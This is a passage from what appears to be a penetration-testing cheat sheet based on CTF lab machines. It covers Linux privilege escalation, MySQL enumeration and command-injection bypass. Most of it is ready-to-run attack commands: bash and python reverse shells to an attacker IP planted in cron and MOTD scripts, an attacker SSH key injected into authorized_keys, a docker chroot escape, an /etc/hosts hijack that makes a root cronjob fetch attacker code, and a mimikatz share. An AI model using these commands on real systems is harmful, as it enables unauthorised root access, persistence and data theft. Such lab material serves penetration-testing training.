Then run:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LXD group

### Group executable permission

Useful to know if specific files can be run by a group (i.e., `users`). In this manner, all users belonging to the `users` group have the permission to run thse files. To discover these files that can be run by a group, run:
```
find / -type f -group users 2>/dev/null
```
where `users` is the name of the group you are checking for.

So, if two users, `baksteen` and `parede` belong to the `users` group, and `/opt/cube/cube.sh` file has the following permissions:
```
-rw-rwxr-- 1 parede users  851 Mar 11  2018 cube.sh*
```
despite the owner is `parede`, `baksteen` can run this script because the group `users` it belongs has `x` permission. In this example, the script can be also modified because the group has also `w` permission.

### crontab

Look for cron jobs by `cat /etc/crontab` and detect if there is some scheduled script.

#### Reverse Shell by crontab task script

In case we notice a script running on behalf of another user that we would like to escalate, for example:
```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```
and this script is editable, we can write on it a reverse shell. A working command for injecting a reverse shell code in this script could be:
```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.8.16.123/1234 0>&1' > /opt/helloworld.sh
```
Run a `nc -lvnp 1234` and wait for cron task running.

#### SSH Access by crontab task script

In case we notice that the target server has port 22 opened, and there is a script running on behalf of a user that we would like to escalate, for example:
```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```
even if the target user has not `.ssh` folder in it, we can create it and inject an authorized key for accessing to the server on its behalf by:
* creating a ssh key on the attacker machine by `ssh-keygen`, then copy the content of `$HOME/.ssh/id_rsa.pub` in the code to be injected in the cron task script by running the following in the target server:
```
echo -e "#\!/bin/bash\nmkdir -p /home/archangel/.ssh\necho \"ssh-rsa <copied_pubkey> athena@penthost\" >> /home/archangel/.ssh/authorized_keys" > /opt/helloworld.sh
```
so the command should appear as:
```
echo -e "#\!/bin/bash\nmkdir -p /home/archangel/.ssh\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQClcqMkC95QYCF6O6Jtm2UNEVxpgzc8H4xLotJg4SPS1GfOQR3TzNxl4lnCX7b8EMZsxRCTaXvLIBKsTnlvZaR5G3K+iyIFIQqmADgm7XgITEy/oKOy2WIq6Q3CH1+Zt+oT0THYKXXwczGIcF8mvJU5a+poo+GifJ/AEXpcQyatHcUzAmj7kLdAWw/JNIWnvYCX/dwuFHa693ViVloTtKXD8q1NAGTXJ+wGsr9SBj+EXSLht1LIMxbJOw8eRyDNmaHfNJTOz0xMm6ya5jk2eI73xesjoAfGRoXDzsdvWSlE085U8KfRDOiWWXYcZvM3HnnQktqThzbfkUufaM86AkB/lLB7Zxmiwv6O2WJJoPvsxvMX3NHEPUbkrz6dKZgW1EzvFl7dyGaDqhUoMqKwcgPu2m/2vKKf9hx0Wa5WepVKbElrEBT552Rvfq9FiUOyy8YZhqdQHcfj3j+qoow3YwEu02MHJ1avR+ySTREdooOxpZrmOuTxKX3Fyf62Azzq9uk= athena@penthost\" >> /home/archangel/.ssh/authorized_keys" > /opt/helloworld.sh
```
note that escape character before the `!` at the beginning, otherwise it will be read as bash event.

Then, wait for the cron job running and, on the attacker machine, run:
```
ssh archangel@mafialive.thm
```

### Hidden cronjobs

Run `pspy` for discovering scripts (processes) run as `root` in a scheduled manner.

### Running script as root

#### Running script as root from custom banner for SSH login

If you note that during a SSH login you see a custom banner, there should be a script that is stored in `/etc/update-motd.d` or stored in another folder of the system but invoked in one of the files stored in `/etc/update-motd.d` folder (Message of the Day folder).

When you login on the system, for example by SSH, this "Message of the Day" script is run as `root`, so, if you can edit this script file, you can add a reverse shell code as:
```
#!/bin/sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.16.123",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

and then, after setting a netcat listener, login by SSH. You will gain a reverse shell as root.

#### Running script as root from a specific domain
Let's guess that a script called `overpass.thm/downloads/src/buildscript.sh` is run as sudo by a cronjob and we cannot find or edit the local `buildscript.sh` file.

Check `/etc/hosts` file has write permission for all users:
```
ll /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```
Let's edit it and make a HTTP server in order to run our custom buildscript. Let's create the following buildscript in our attacker machine in the `downloads/src/buildscript.sh` path inside the root of our small HTTP server:
```
cp -rf /root/root.txt /home/james/
chmod +r /home/james/root.txt
```
Then, on the target machine edit the line containing `overpass.thm` with the attacker machine IP address:
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.18.98.39 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
save the file. Then, run the HTTP server on the port 80 on the attacker machine on the folder containing `downloads/src/buildscript.sh` you created the custom script:
```
sudo python -m http.server 80
```
and wait for the cronjob.

## Disabled commands

Some web console or a target machine could have some commands disabled for avoiding the user could read files. Try other similar commands for reading files, for example:
```
cat
most
head
less
```

## Windows

### Hidden files

Search for hidden files and folders. If something suspicious appears, like `backup` or similar, and the files inside cannot be accessed due to permissions, check if your user is the owner of that file, and assign the right permissions for accessing this file.

# Misc

## MySQL commands

Accessing to MySQL database by `mysql` client:
```
mysql -u root -p -h localhost webportal
Enter password: !@m+her00+@db

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+

mysql> use webportal
Database changed

mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+

mysql> DESCRIBE users;
+-----------+--------------+------+-----+---------+----------------+
| Field     | Type         | Null | Key | Default | Extra          |
+-----------+--------------+------+-----+---------+----------------+
| id        | int(11)      | NO   | PRI | NULL    | auto_increment |
| firstname | varchar(100) | YES  |     | NULL    |                |
| lastname  | varchar(100) | YES  |     | NULL    |                |
| username  | varchar(100) | YES  |     | NULL    |                |
| password  | varchar(100) | YES  |     | NULL    |                |
+-----------+--------------+------+-----+---------+----------------+

mysql> SELECT * FROM users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```

## Command Injection Filtering

In a web command field, if restricted, but you can still run `echo`, try:
```
echo $(<command>)
```

## RDP File Transfer

Use `rdesktop -r sound:local -r disk:RandomShareName=/usr/share/windows/mimikatz -P 10.10.15.211` for creating a share folder between the attacker machine and the target Windows machine.

# Considerations

In general, if you find a vulnerable web application, for example UniFi Network, you can search it on Shodan by http.html:"UniFi Network" (of course hoping for vulnerable versions).
